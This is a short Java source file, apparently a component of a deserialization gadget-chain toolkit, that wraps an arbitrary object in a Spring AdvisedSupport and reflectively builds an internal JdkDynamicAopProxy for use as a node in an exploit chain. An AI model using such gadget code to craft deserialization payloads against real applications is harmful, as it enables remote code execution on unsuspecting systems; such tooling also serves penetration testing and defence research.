package gadgets;

import common.Reflections;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.target.SingletonTargetSource;

public class JdkDynamicAopProxyNode {

    public static Object makeGadget(Object gadget) throws Exception {
        AdvisedSupport as = new AdvisedSupport();
        as.setTargetSource(new SingletonTargetSource(gadget));
        return Reflections.newInstance("org.springframework.aop.framework.JdkDynamicAopProxy",AdvisedSupport.class,as);
    }
}
